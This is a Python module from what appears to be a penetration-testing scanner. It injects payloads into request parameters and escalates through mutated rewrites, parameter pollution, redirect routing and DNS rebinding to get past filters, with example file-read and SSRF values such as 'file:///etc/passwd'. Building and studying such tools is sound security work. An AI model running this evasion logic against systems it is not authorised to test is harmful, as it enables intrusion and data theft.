"""Placing a payload in a parameter, and climbing when it is refused.

Every vulnerability module starts the same way: take the request the operator
handed over, find the parameter to inject into, put a value there, and watch
what the target does with it. Only the values differ. So the mechanics live here
- inject, escalate, scope what was learned - and a module brings its own seeds
and its own graph.

Escalation is the part worth understanding. Generation 0 is the seed exactly as
written, so an unprotected target costs one request and never sees a mutation. A
generation is exhausted before the next is tried, so cheap rewrites are spent
before exotic ones, and a rewrite this target has already refused is skipped:
a filter that lower-cases its input defeats case-swap once, and rediscovering
that per payload is how a scan turns into noise.
"""

from __future__ import annotations

import ipaddress
import re
from typing import Callable

from ..core.httpmsg import Request
from ..core.mutate import Kind, Variant, applicable
from ..core.params import Encode, Param, Where, pollute, rewrite
from ..core.protocols import with_host
from .blackboard import Confidence

VIA_PLACEHOLDER = "{target}"

# The most variants one generation may spend on one seed.
#
# The budget is derived from the catalogue rather than fixed, because a fixed
# number starves whatever sits past it: every applicable rewrite has to reach the
# wire at least once, and two of the classes already have more rewrites than the
# constant that used to be here, so the ones ranked last were never sent at all.
#
# The ceiling is what stops a catalogue that keeps growing from turning one
# parameter into a flood. It is a backstop, not a target: when the catalogue
# reaches it the two rules genuinely conflict, and the way to find out is a test
# that fails rather than a rewrite that quietly stops being sent. See
# `tests/test_mutate.py`, which asserts the catalogue stays under this.
GENERATION_CEILING = 48


def generation_budget(kind: Kind, exclude_families: frozenset[str], requested: int = 0) -> int:
    """How many variants a generation may send.

    The count of applicable rewrites is the floor, so none of them is dropped for
    want of budget. `requested` raises it when a caller wants more. The ceiling
    caps both, and a test guards that the catalogue has not reached it.
    """
    return min(GENERATION_CEILING, max(requested, len(applicable(kind, exclude_families))))


def candidates(ctx) -> list[Param]:
    """The parameters this run is allowed to touch."""
    return list(ctx.config.get("params") or [])


def template(ctx) -> Request:
    """The request as the operator supplied it, before any payload."""
    return ctx.config["request"]


def inject(ctx, param: Param, payload: str, action: str, encoded: bool = False):
    """Place a payload in one parameter and send it.

    Encoding is decided per payload, not once for the whole run. An ordinary
    value (`file:///etc/passwd`) must be percent-encoded to survive a query
    string. A value a mutator has already put into transport form
    (`file%3A%2F%2F%2Fetc%2Fpasswd`) must be sent **as it stands**: encoding it
    again hands the application a literal percent sequence instead of a URL, and
    the mutation that was supposed to get past the filter becomes the reason
    nothing works.
    """
    if param.where.value == "header" or encoded:
        encode = Encode.NONE
    else:
        encode = Encode.URL
    request = rewrite(template(ctx), param, payload, encode)
    exchange = ctx.send(request, action=action)
    return request, exchange


def route_via(ctx, payload: str) -> tuple[str, bool]:
    """Send the payload through a host the filter already trusts.

    A whitelist cannot be argued with: the destination has to be named as
    something the filter accepts, and only then reach somewhere else. The
    operator supplies the shape (`http://allowed/redirect?to={target}`) because
    only they know what the target trusts; everything else stays the same.
    """
    templates = ctx.config.get("via") or []
    if not templates:
        return payload, False
    return templates[0].replace(VIA_PLACEHOLDER, payload), True


def climb_order(max_generation: int) -> list[int]:
    """The generations to try, in the order to try them: every one, bottom up.

    There used to be a floor here - `start = ctx.bypass.floor(host, action)`, where
    an earlier run had got through - and the climb began there instead of at zero.
    It saved requests when the floor was right and removed work when it was wrong,
    and the second is not a cost this can pay: a filter that compared its blocklist
    without folding case was reachable with `PHP://`, which is generation 1, while
    the floor stood at 2 from an earlier run. Generation 1 was never sent. 164
    requests, 86 refused, the read reported as not done.

    Reordering was not enough either. The climb stops at the first generation
    where a rewrite was not refused, so putting the floor's generations first only
    helps while they are all refused; on a target that accepts them, the climb
    settles there and never descends. And the floor only ever rose, so a wrong one
    was never corrected - it stayed in the session and was paid for on every run.

    So the order is the plain ascent, generation 0 first. That is also what this
    project says a prior is allowed to do: order the work, never decide that work
    is unnecessary. Which rewrite is likely to get through is the pheromone
    table's job, and it already learns that per mutator.
    """
    return list(range(max_generation + 1))


def inject_escalating(
    ctx,
    param: Param,
    seed: str,
    action: str,
    kind: Kind = Kind.SSRF,
    max_generation: int = 3,
    per_generation: int = 12,
    allow_pollution: bool = True,
    exclude_families: frozenset[str] = frozenset(),
    until: Callable[[object], bool] | None = None,
    abandon: Callable[[object], bool] | None = None,
    scope: str = "",
):
    """Send a seed, climbing one generation at a time only while refused.

    `exclude_families` is for rewrites the thing being targeted cannot run at
    all - a spelling only one shell dialect accepts, say. They are dropped before
    the ladder is built, because a rewrite that cannot work is not a bypass that
    failed, and spending requests on it teaches the priors something false.

    `until` is for the case where getting past the filter is not the answer.
    Somewhere the question is "did the value reach a parser", and a rewrite that
    is accepted has answered it. Elsewhere acceptance means only that nothing
    objected, and the payload still has to do something - a command has to run,
    a value has to come back changed. Supplying `until` keeps the climb going
    until that happens, rather than stopping at the first request nobody
    refused.

    `abandon` is the other half of that. A target that takes fifteen seconds over
    a payload it did not run - because the value reached a command as an argument
    and the command is waiting on a name it cannot resolve - will take fifteen
    seconds over the next forty rewrites of it too, and the answer will be the
    same. Leaving the seed unclimbed is not giving up on the target; the other
    seeds are still tried. Nothing is rewarded and no floor is raised for a seed
    abandoned this way, because nothing was learned about the filter.

    `scope` names the family a rewrite verdict belongs to, for a caller whose
    payloads do not carry a scheme to derive one from. What was learned about a
    spelling is worth carrying to the next target of the same kind and not to a
    different kind, so a module that knows what its own payload families are
    supplies the name.
    """
    host = template(ctx).host()
    # What a refused rewrite proves, and what it does not. A blocklist matches
    # literals, and payload families carry different ones: `gopher://<internal>`
    # keeps a scheme for the filter to catch however the address is spelled,
    # while `http://<internal>` does not. So the verdict is scoped to the family
    # (scheme, and whether the host is an address or a name), and a rewrite that
    # failed there is not tried again for the next payload in the same family -
    # that is where a scan turns into noise.
    scope = scope or payload_scope(seed)
    last = None
    budget = generation_budget(kind, exclude_families, per_generation)

    # Before any rewrite, one attempt that is not a rewrite: the same parameter
    # sent a second time, original value first and payload last. A filter reading
    # one value per name sees the first; a runtime keeping the last sees the
    # payload. It is recorded under its own name so the priors learn whether this
    # target's filter reads every occurrence or only the first.
    if allow_pollution and param.where in (Where.QUERY, Where.BODY, Where.COOKIE):
        request = pollute(template(ctx), param, seed)
        exchange = ctx.send(request, action=action)
        variant = Variant(value=seed, generation=0, mutators=("pollute",))
        last = (request, exchange, variant)
        if not ctx.last_refused:
            if ctx.pheromone is not None:
                ctx.pheromone.reward(scope, ("pollute",), amount=0.5)
            # Getting through is the answer only when getting through is the
            # question. Where the caller wants an effect, the ladder still has to
            # run - returning here is how a module ends up sending the pollution
            # request and nothing else, and reporting the result of a probe it
            # never made.
            if until is None or until(exchange):
                return last
            if abandon is not None and abandon(exchange):
                # The target sat on the polluted value, so it will sit on the
                # seed too: the same payload is the last one either way.
                ctx.log(f"   {action}: the polluted value took {exchange.response.elapsed:.1f}s; "
                        "leaving this seed unclimbed")
                return last
        elif ctx.pheromone is not None:
            ctx.pheromone.punish(scope, ("pollute",))

    for generation in climb_order(max_generation):
        pool = [
            variant
            for variant in ctx.variants(
                seed,
                generation=generation,
                kind=kind,
                limit=400,
                exclude_families=exclude_families,
            )
            if variant.generation == generation
        ]
        # What is likely to get through goes first. This is a prior, not a
        # filter: a rewrite the table dislikes is still tried, just later.
        if ctx.pheromone is not None:
            pool = ctx.pheromone.rank(scope, pool)

        attempted = 0
        for variant in pool:
            if ctx.stopped or attempted >= budget:
                break
            if any(ctx.bypass.mutator_dead(host, action, name, scope) for name in variant.mutators):
                continue
            attempted += 1
            routed, used_via = route_via(ctx, variant.value)
            request, exchange = inject(
                ctx,
                param,
                routed,
                action,
                # A routed payload has to survive a query string as a whole, so
                # a variant that was already encoded is no longer in transport
                # form once it has been wrapped.
                encoded=variant.encoded and not used_via,
            )
            last = (request, exchange, variant)

            if ctx.last_refused:
                for name in variant.mutators:
                    ctx.bypass.mark_mutator_dead(host, action, name, scope=scope)
                if ctx.pheromone is not None:
                    ctx.pheromone.punish(scope, variant.mutators)
                ctx.log(f"   {action}: {variant.describe()} was refused")
                continue

            answered = until is None or until(exchange)
            if answered:
                if ctx.pheromone is not None:
                    # Clearing the filter is worth something, but not much:
                    # whether the value reached a parser is only answerable from
                    # the response, and the caller scores that when it finds
                    # evidence.
                    ctx.pheromone.reward(scope, variant.mutators, amount=0.25)
                if generation > 0:
                    # Kept as a note about the target, not as a bound on the
                    # climb: nothing reads it to decide where to start, because
                    # a floor that is wrong removes work instead of ordering it.
                    ctx.bypass.raise_floor(host, action, generation)
                    ctx.log(f"   {action}: generation {generation} reached the target")
                return last
            # Accepted, but the caller's question is not answered yet. Nothing is
            # rewarded and no floor is raised: this rewrite got past the filter
            # and did nothing, and a floor raised on that would make every later
            # attempt start above its own seed.
            if abandon is not None and abandon(exchange):
                ctx.log(
                    f"   {action}: {variant.describe()} took {exchange.response.elapsed:.1f}s "
                    "without the effect; leaving this seed unclimbed"
                )
                return last
            ctx.log(f"   {action}: {variant.describe()} reached the target without the effect")
    return last


def scheme(payload: str) -> str:
    """The scheme a payload starts with."""
    head = payload.split(":", 1)[0]
    return head.lower() if head.isalnum() else ""


def payload_scope(payload: str) -> str:
    """Which family of payload a bypass verdict belongs to.

    A rewrite that failed against `gopher://127.0.0.1` says nothing about the
    same rewrite against `http://127.0.0.1`, and nothing about a host that is a
    name rather than an address - each carries different literals for a filter
    to catch, and the address rewrites only apply to one of them.
    """
    scheme_name = scheme(payload)
    match = re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://(?:[^@/?#]*@)?([^/?#:]*)", payload)
    host = match.group(1).strip("[]") if match else ""
    if not host:
        return f"{scheme_name}:none"
    if host.lower() == "localhost":
        return f"{scheme_name}:name"
    try:
        ipaddress.ip_address(host)
    except ValueError:
        return f"{scheme_name}:name"
    return f"{scheme_name}:ip"


def rebind_seeds(ctx, payload: str) -> list[str]:
    """The spellings of a destination worth trying for one probe.

    A name that alternates between an address the target accepts and one it does
    not is a second way to reach the same place: a filter that judged the first
    answer, or a check that resolves once and connects later, is answered by the
    second lookup rather than the first.
    """
    rebind = ctx.config.get("rebind")
    if not rebind:
        return [payload]
    return [payload, with_host(payload, rebind)]


def record(ctx, key: str, value: object, evidence: str, confidence) -> None:
    """Note something on the board, under a module's own key."""
    ctx.blackboard.add(key, value, evidence=evidence, confidence=confidence)


def note_finding(ctx, key: str, entry: dict, confidence=None) -> None:
    """Record a finding and print it. Modules own the key and the wording.

    Printed as a block rather than a line, because the payload is the part
    someone reads a scan for: a report that says a parameter is injectable
    without saying with what cannot be reproduced by hand, and reproducing it by
    hand is the whole point of finding it.
    """
    record(
        ctx,
        key,
        entry,
        evidence=entry.get("evidence", ""),
        confidence=confidence or entry.get("confidence") or Confidence.CONFIRMED,
    )
    lines = [
        "[!] {name} via {param}".format(
            name=entry.get("name", "?"),
            param=entry.get("param", "?"),
        )
    ]
    if entry.get("payload"):
        lines.append(f"      payload:   {entry['payload']}")
    if entry.get("evidence"):
        lines.append(f"      evidence:  {entry.get('evidence', '')}")
    if entry.get("generation"):
        lines.append(f"      generation: {entry['generation']}")
    if entry.get("note"):
        lines.append(f"      note:      {entry['note']}")
    ctx.emit("\n".join(lines))
